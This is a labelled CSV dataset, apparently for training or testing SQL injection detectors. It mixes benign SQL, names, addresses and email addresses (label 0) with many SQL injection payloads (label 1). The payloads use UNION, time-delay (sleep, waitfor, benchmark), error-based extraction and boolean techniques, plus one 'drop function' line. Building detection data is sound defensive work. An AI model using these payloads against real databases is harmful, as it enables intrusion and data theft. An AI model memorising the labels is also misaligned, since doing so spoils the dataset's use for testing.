Query,Label
"1%""   )    )     )  ",1
SELECT cutting ( s )  FROM other,0
-5432'  )   as dndq where 9633  =  9633 order by 1#,1
camio canexa 161 11?g,0
SELECT * FROM popular WHERE grandfather = 'after' FETCH FIRST 3 ROWS ONLY,0
2.61077E+15,0
espins marmesat,0
SELECT * FROM them FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM package WHERE slip = 'dozen'  AND City = 'palace',0
"c/ alcaices, 23",0
"-5379'  )   union all select 4294,4294,4294--",1
-9484' or   (  7129  =  2349  )  *2349 and 'fcsa' like 'fcsa,1
SELECT AVG ( hand ) FROM term SELECT SUM ( stomach ) ,0
SELECT * FROM depth WHERE mountain = 'women' FETCH FIRST 3 ROWS ONLY,0
"  SELECT cheeseID AS ID, obtain AS fed FROM stay",0
"c/ mare de deu de fatima, 165",0
37311,0
;waitfor delay '0:0:__TIME__'--,1
6.25525E+15,0
" SELECT * FROM happy ORDER BY power, promised",0
SELECT fell FROM single UNION ALL SELECT crew FROM stomach ORDER BY aboard,0
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_button_2_text' LIMIT 1,0
graydon,0
1' in boolean mode  )   and 4595  =  4595#,1
"INSERT INTO fact ( difficult, wherever, movie, page, twice, mistake )  VALUES  ( 'collect', 'park'. room', 'army', 'grow', 'shall', 'board' )  ",0
wickens@cpanelhost.com.ht,0
SELECT * FROM truth FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM hall,0
"INSERT INTO laugh ( ants, increase, youth, fight, breath, pride )  VALUES  ( 'rough', 'freedom'. victory', 'hardly', 'took', 'standard', 'easier' )  ",0
SELECT COUNT ( wireID ) FROM worth,0
tabaquera,0
SELECT TOP 50 PERCENT * FROM basket SELECT * FROM record FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM youth,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367678,299806,299807,367679,299808,80777,30322,80782,28561,262315,299804,30387,228217,367680,367681,367682,367683,367684,367685,367686,30220,262317,30380,80779,30384,30390,80780,290065,291072,320706 )  ORDER BY meta_id ASC",0
1 waitfor delay '0:0:10'--,1
 (  select   (  case when   (  4108  =  4108  )   then 1 else 4108*  (  select 4108 from information_schema.character_sets  )   end   )    ) ,1
SELECT * FROM went WHERE slow BETWEEN aware09/01/1996exist AND route15/31/1996smaller,0
nanjar viejo,0
"calle darsena san magin 198,",0
"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",1
"1"" where 2452  =  2452",1
feix ablitas,0
1%'   )    )     )   order by 1#,1
SELECT * FROM caught FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM floating,0
"1   )    )    as hqwy where 4433  =  4433 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
SELECT * FROM art WHERE grabbed BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM research ORDER BY rush,0
"-4005' where 3963  =  3963 or elt  (  1032  =  1032,3623  )  --",1
1'||  (  select 'zxla' from dual where 7634  =  7634 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ||',1
"   SELECT apple,around,brief,traffic,product     (  (  roll JOIN social ON magnet.immediately =  fought.wait )   INNER JOIN citizenON Orders.promised =  brief.gainID ) ",0
urea bernat,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""tbcc""  =  ""tbcc",1
-4384'   )    )     )   or 6872  =  6872 and    (    (     (  'ukhl'  =  'ukhl,1
SELECT AVG ( second ) FROM hill SELECT SUM ( brother ) ,0
" select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1
"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""cwpt"" like ""cwpt",1
"1' in boolean mode  )   and make_set  (  8403  =  8403,8899  )  #",1
"  SELECT needed AS duck, fire AS [automobile]  FROM throughout",0
SELECT MIN ( brain )  AS golden FROM individual,0
SELECT * FROM between WHERE palace  BETWEEN 10 AND 20,0
94lp90ulo,0
SELECT * FROM mouth WHERE copy = 'universe'  OR done = 'men',0
enaltecedor,0
"1'+  (  select 'aliz' where 5050  =  5050 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'",1
SELECT AVG ( kind )  FROM strike  SELECT SUM ( cookies ) ,0
"1'+  (  select 'otqy' where 2754  =  2754 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'",1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""%""  =  """,1
amedee@spainbb.cc,0
"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'yhpp' like 'yhpp",1
"  SELECT aroundID AS ID, appearance AS aid FROM child",0
"-4807' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'wwki'  =  'wwki",1
SELECT Count ( * )  AS badly,0
"1"" union all select null,null--",1
SELECT MIN ( symbol )  AS while FROM hurried,0
SELECT AVG ( locate )  FROM pilot  SELECT SUM ( practice ) ,0
"1  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  5215  =  5215",1
" end and    (    (     (  ""poee""  =  ""poee",1
"  SELECT Orders.ninerID, Employees.teach, Employees.canal FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.straightID ORDER BY Orders.compoundID",0
SELECT creature FROM pole UNION ALL SELECT involved FROM slip ORDER BY want,0
1  )   as eryo where 2531  =  2531 rlike sleep  (  5  )  --,1
"calle san isidro labrador 188, 13?h",0
8.04948E+15,0
8855,0
"-6236'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
6.51129E+15,0
bartlett@waterflyesp.eh,0
1'||  (  select 'lkmh' where 7659  =  7659,1
"   SELECT shot,bigger,needed,population,beyond     (  (  forth JOIN discuss ON thrown.number =  trouble.produce )   INNER JOIN indicateON Orders.arrive =  neck.unusualID ) ",0
SELECT TOP 3 * FROM round SELECT * FROM pig 3SELECT * FROM pan,0
SELECT slipped FROM drove UNION SELECT alone FROM name ORDER BY planning,0
rainmake,0
antonio juez 67 3?a,0
"1%"" and elt  (  4249  =  4249,7259  )   and ""%""  =  """,1
"c/ francisco javier simonet 7, 11?e",0
1   )    )    as xlww where 5844  =  5844,1
" SELECT * FROM military ORDER BY lower, courage",0
1'  )   where 5286  =  5286,1
"1%' or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT branch FROM basic,0
"  SELECT gold,men FROM quite WHERE learn = 'say' UNION SELECT personal, rear FROM damage",0
lucio,0
SELECT * FROM wonder WHERE rocket NOT BETWEEN 'example' AND 'spider',0
SELECT AVG ( pale ) FROM suppose SELECT SUM ( drive ) ,0
SELECT AVG ( first ) FROM compass SELECT SUM ( chair ) ,0
"1""  )   where 9545  =  9545 and 9198  =  9198--",1
SELECT COUNT ( needle )  FROM difficulty,0
1  )   as iqkf where 7780  =  7780,1
eby@miplat.nl,0
SELECT * FROM arrow  WHERE interest = mouth,0
"  SELECT tried,accurate,stared FROM fellow LEFT JOIN Orders ON lose.happenID =  broke.list ORDER BY tribe.husband",0
SELECT * FROM nothing WHERE social = 'simply' LIMIT 3,0
1 where 9872  =  9872,1
"select * from generate_series  (  3551,3551,case when   (  3551  =  6451  )   then 1 else 0 end  )   limit 1--",1
SELECT * FROM hurry WHERE scientific BETWEEN '1996-07-01' AND '1996-07-31',0
"1""   )    )    as casz where 5921  =  5921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1
SELECT * FROM in WHERE behavior = 'heart' LIMIT 3,0
SELECT * FROM some WHERE paint = 'composition' FETCH FIRST 3 ROWS ONLY,0
"1'  )   where 9091  =  9091 union all select null,null,null,null#",1
SELECT accurate ( s )  FROM huge FULL OUTER JOIN,0
"  SELECT * FROM for WHERE silence NOT IN  ( 'rise', 'roar', 'one' )  ",0
SELECT Count ( * )  AS completely,0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c83ee379f0' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
SELECT AVG ( policeman )  FROM memory  SELECT SUM ( clothes ) ,0
"1'  )   as qaec where 6572  =  6572 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"SELECT * FROM love WHERE pour BETWEEN ""period"" AND    ""full""",0
-2992%'   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  '%'  =  ',1
SELECT * FROM thick FETCH FIRST 3 ROWS ONLY,0
"1' in boolean mode  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",1
DELETE FROM engine WHERE size = 'straight',0
8775,0
"c/ la lila, 83,",0
SELECT over ( s )  FROM brother SELECT actual ( s ) ,0
yihban,0
herrmann@codwatw.edu,0
"iif  (  6307  =  2459,1,1/0  )  ",1
"1%'   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"-5738""  )   as efbn where 8541  =  8541 union all select 8541,8541,8541,8541,8541,8541,8541,8541#",1
03307827j,0
barby,0
"1""  )   as ufai where 9673  =  9673",1
SELECT * FROM loose WHERE depth = 'attention' FETCH FIRST 3 ROWS ONLY,0
" SELECT column_name ( s )  FROM no,former",0
"   SELECT grade, reason, automobileFROM no WHERE obtain  IS NOT NULL",0
"1' in boolean mode  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
me73ga,0
SELECT bigger ( s )  FROM rough SELECT reach ( s ) ,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28080 )  ORDER BY meta_id ASC",0
"-6639'  )   as trll where 6271  =  6271 union all select 6271,6271,6271#",1
rohtert,0
"   SELECT COUNT ( drove ) , divide FROM soap BY box",0
promanar,0
SELECT * FROM enjoy WHERE shirt BETWEEN 'stranger' AND 'most',0
"1'   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'dgwe' like 'dgwe",1
"SELECT * FROM cow WHERE torn BETWEEN ""butter"" AND    ""refused""",0
"1""   )    )    as tsry where 6594  =  6594 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1
"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",1
"  SELECT making AS hang, class AS [found]  FROM claws",0
1 where 4641  =  4641,1
tromba,0
"   SELECT nest, think+ ', ' + game+ ' ' + present+ ', ' + gain AS minerals  FROM physical",0
SELECT * FROM pride WHERE NOT directly = 'thousand'  AND NOT instant = 'spread',0
35093869d,0
"1  )   as rbmn where 5948  =  5948 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT * FROM listen WHERE without BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT master FROM jack,0
"1""  )   as zuzm where 1211  =  1211 and elt  (  5458  =  2966,2966  )  --",1
"1'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT TOP 50 PERCENT * FROM surprise SELECT * FROM bare FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM deal,0
1.4996E+15,0
SELECT MIN ( directly )  AS notice FROM related,0
tamerlani@ubikuo.cc,0
68318279e,0
-5880'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'rwgl'  =  'rwgl,1
"1""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""ubvd""  =  ""ubvd",1
9.92218E+14,0
17889538t,0
"SELECT customername, contactname FROM  customers; ",0
gianna,0
en546al,0
" select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",1
"   SELECT exist, average, presentFROM certain WHERE person  IS NOT NULL",0
1 where 9774  =  9774,1
ajuagas,0
8ro4,0
"   SELECT swept, day, chain FROM nothing WHERE happily  IS NULL",0
1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,1
28820,0
SELECT * FROM express WHERE dear = 'sense' LIMIT 3,0
3nmo08v16a,0
SELECT * FROM tower WHERE built BETWEEN 'audience' AND 'pond',0
1%'   )    )     )   rlike   (  select   (  case when   (  7697  =  3334  )   then 1 else 0x28 end   )    )    and    (    (     (  '%'  =  ',1
1  )   where 9167  =  9167,1
-5134   )    )     )   or 8571  =  8571--,1
"iif  (  1095  =  2853,1,1/0  )  ",1
"INSERT INTO fire ( very, shout, string, lips, dollar, was )  VALUES  ( 'completely', 'flow'. border', 'acres', 'jungle', 'captain', 'blew' )  ",0
57401003h,0
"-2982' or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'iqwn'  =  'iqwn",1
"   SELECT Employees.deer, COUNT ( Orders.villageID )  AS peaceFROM    ( OrdersINNER JOIN hello ON Orders.dinnerID  =  Employees.sickID ) ",0
"gimnasia 153, 4?e",0
SELECT AVG ( basket ) FROM problem,0
end and    (    (     (  '%'  =  ',1
"1%'   )    )    union all select null,null,null,null--",1
"INSERT INTO thirty ( stems, prepare, sure, lovely, surface, food )  VALUES  ( 'cap', 'view'. official', 'learn', 'buffalo', 'giant', 'fish' )  ",0
SELECT heart ( s ) FROM full INNER JOIN,0
"1%' or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
9530,0
FROM  ( SELECT DISTINCT lion FROM asleep ) ,0
"-5227"" union all select 2666--",1
8en7dill3,0
46593,0
3.00245E+15,0
"1%""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""%""  =  """,1
neira umbert,0
yu-hung,0
SELECT SUM (  column_name  )  FROM table_name WHERE condition ;,0
SELECT TOP 3 * FROM drawn WHERE feel = 'gulf' SELECT * FROM six,0
1' where 5230  =  5230,1
cotizada,0
7.86165E+15,0
SELECT * FROM minute WHERE story = 'student'  AND City = 'bill',0
gumersindo,0
el-am,0
c26ve7sar,0
"  SELECT aroundID AS ID, value AS tongue FROM surprise",0
" select * from users where id  =  1 <@1$ union select 1,version  (    )   -- 1",1
"   SELECT slipped, sister, street FROM exactly WHERE blood  IS NULL",0
FROM  ( SELECT DISTINCT girl FROM discuss ) ,0
SELECT * FROM willing FETCH FIRST 3 ROWS ONLY,0
"   SELECT die, hard+ ', ' + ask+ ' ' + suggest+ ', ' + drop AS threw  FROM ability",0
1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,1
"-4588"" union all select 4550,4550,4550,4550#",1
"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'opll' like 'opll",1
"-5207  )   where 6987  =  6987 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
1212,0
SELECT COUNT ( seedID ) FROM return,0
jengibre,0
ana,0
SELECT * FROM corn,0
"-6370'   )    )    as sims where 9388  =  9388 union all select 9388,9388,9388,9388,9388,9388,9388,9388#",1
1450,0
SELECT DISTINCT herd FROM wire,0
SELECT * FROM take WHERE country NOT BETWEEN 'deer' AND 'military',0
"1%""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
select * from users where id  =  1 %!<@ or 1  =  1 -- 1,1
leda,0
2672,0
if  (  9770  =  9748  )   select 9770 else drop function zyuo--,1
spain@erasmusrooms.bi,0
pangborne@europop.mw,0
SELECT COUNT ( thirty ) FROM bar,0
guadiana 149 6f,0
es3regamiento,0
SELECT instrument FROM way UNION SELECT vast FROM sport ORDER BY rubber,0
"-7101   )    )     )   union all select 4587,4587,4587,4587,4587,4587--",1
SELECT * FROM stood WHERE NOT early = 'although'  AND NOT dollar = 'sight',0
"1%'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   '%'  =  '",1
SELECT DISTINCT citizen FROM everywhere,0
prdena del rincn,0
"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mexd' like 'mexd",1
"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1
SELECT MIN ( condition )  AS sand FROM tent,0
SELECT * FROM excitement WHERE independent LIKE '%position%',0
"1,  (  case when 2872  =  2872 then 1 else null end  )  ",1
henry@sms24h.tr,0
leandro,0
"-2027%""  )   union all select 2048,2048,2048,2048,2048,2048,2048,2048#",1
SELECT * FROM gun WHERE thy = 'surface'  OR compass = 'total',0
SELECT * FROM explore WHERE turn = 'general' LIMIT 3,0
song@eyewear.nom.aw,0
"1""  )   where 2312  =  2312 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
